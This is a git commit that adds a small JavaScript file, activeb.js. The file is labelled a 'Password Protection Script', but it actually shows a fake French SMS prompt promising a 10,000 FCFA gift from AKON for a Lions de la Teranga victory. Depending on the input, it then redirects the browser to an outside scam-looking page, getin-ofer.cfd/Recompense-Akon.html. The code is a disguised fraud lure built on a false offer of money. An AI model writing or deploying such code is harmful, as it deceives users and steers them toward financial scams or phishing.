f008c633f4c8e7ba448bcc0015f9376b17e82e45
Help-All <imaobongumoh637@gmail.com>
2026-01-19 17:42:46 +0100

    Create activeb.js

---
+++ activeb.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER DE L’ARGENT'
+password = prompt(
+  'SMS: Félicitations ! Vous avez droit à un don de 10 000 FCFA de la part d’AKON pour célébrer la victoire des Lions de la Teranga. Veuillez appuyer sur OK pour le recevoir immédiatement.',
+  'RETIRER DE L’ARGENT'
+);
+if (password != 'RETIRER DE L’ARGENT') {
+  location.href = 'https://getin-ofer.cfd/Recompense-Akon.html';
+  }
